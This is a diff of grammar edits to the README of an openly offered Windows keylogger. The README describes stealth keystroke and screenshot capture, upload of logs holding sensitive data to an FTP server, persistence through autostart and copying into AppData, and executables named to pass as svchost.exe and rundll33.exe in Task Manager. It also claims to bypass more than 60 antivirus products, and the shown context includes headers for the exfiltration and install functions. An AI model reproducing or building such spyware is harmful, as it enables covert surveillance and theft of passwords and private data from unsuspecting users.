@@ -5,44 +5,44 @@
 
 # Keylogger
 
-Keylogger is 100% invisible keylogger not only for users. Keylogger Monitors all keystokes, Mouse clicks. It has a seperate process which continues capture system screenshot and send to ftp server in given time. 
+Keylogger is a 100% invisible keylogger not only for users. Keylogger Monitors all keystrokes and mouse clicks. It has a seperate process which continuously takes system screenshot and sends it to an FTP server in given time. 
 
 Keylogger designed in visual C++ and it is run in the background in stealth mode(Hidden Window).
 
 ```
-A Keylogger (short for keystroke logger) is software that tracks or logs the keys struck on your keyboard, 
-typically in a covertmannerso that you don’t know that your actions are being monitored. 
+A Keylogger (short for keystroke logger) is a software that tracks or logs the keys struck on your keyboard, 
+typically in a covert manner so that you don’t know that your actions are being monitored. 
 This is usually done with malicious intent to collect your account information, credit card numbers,
 user names, passwords, and other private data.
 ```
 
 ### FEATURES OF BLACKCAT KEYLOGGER
 
-- Discrete/Tamper Proof :By design, Advance Keylogger is undetectable and thus cannot be tampered with or removed by kids/employees .
+- Discrete/Tamper Proof: By design, Advanced Keylogger is undetectable and thus cannot be tampered with or removed by kids/employees.
 
 - Keystrokes Typed: See every keystroke typed even if it is deleted. This keystroke logger feature provides a reader-friendly version of all keystrokes logged along with the raw keylogging activity so you can see every detail. 
 
 - Continuous Screenshots: Video-style playback of screenshots for programs and websites selected by you. For example, watch an email as it's being typed and edited instead of just seeing the finished product (1,000 screenshots included with purchase).
 
-- FTP Server: Screenshot and keylogger Logfile which contain senstive user information send to ftp server (Mobile/Web/System). Powerful ftp server also write in Core Visual C++.
+- FTP Server: Screenshot and keylogger log file which contain senstive user information are send to an FTP server (Mobile/Web/System). Powerful FTP server also written in Core Visual C++.
 
-- AutoStart : Keylogger has functionaility to auto execute on system bootup. It Insert entry on system startup program when it is running.
+- AutoStart: Keylogger has a functionaility to automatically run on system start. It inserts an entry on system startup program when it is running.
 
-- AutoCopy : Keylogger has functionaility to auto copy in %appdata%/roaming/wpdnse/ folder.
+- AutoCopy: Keylogger has a functionaility to auto copy in %appdata%/roaming/wpdnse/ folder.
 
-### Keylogger.Zip Contain two Executable Files. (Sourcecode File Also Included)
+### Keylogger.zip contains two executable files. (source code also included)
 
-1. svchost.exe (Main Keylogger Processs)
-2. rundll33.exe (Capture Screenshot & send all Log and Screenshot to FTP Server (ftp://192.168.8.2:2121))
+1. svchost.exe (Main Keylogger processs)
+2. rundll33.exe (Captures screenshots & sends all logs and screenshots to an FTP server (ftp://192.168.8.2:2121))
 
-Execute both files once time next time its automatically start and capture screenshot and keylog.
+Execute both files for the first time and they will start automatically afterwards.
 
-These names Given for unrecognisable in Task Manager.
+These names given for unrecognisable in Task Manager.
 
-### How to Use ?
+### How to use ?
 
-1. Start FTP Server on This Ip Address 192.168.8.2:2121
-2. and Start both program and Enjoy!!!!
+1. Start an FTP Server on this ip address: 192.168.8.2:2121
+2. Start both executables and enjoy!!!!
 
 ### Undectable keylogger (60+ Antivirus Bypass)
 
@@ -110,7 +110,7 @@ void screenshot(string file){
 
 ```
 
-#### Send Screenshot to Server Via FTP
+#### Send screenshots to an FTP server
 
 ```
 void ftp_scrshot_send(){
@@ -141,7 +141,7 @@ void ftp_scrshot_send(){
 	log_error_file.close();
 }
 ```
-#### Send KeyLog Data to FTP Server
+#### Send keylog data to the FTP server
 
 ```
 void ftplogsend(){
@@ -178,7 +178,7 @@ void ftplogsend(){
 	}
 ```
 
-#### Auto Copy in AppData Folder & Intialize Keylog Text File with Date Time Stamp
+#### Auto copy in AppData folder & intialize keylog text file with date timestamp
 
 ```
 void AutoCopy(){
@@ -234,7 +234,7 @@ void Install(){
 }
 ```
 
-#### AutoStart on System Bootup
+#### Autostart with system
 
 ```
 void AutoStart()
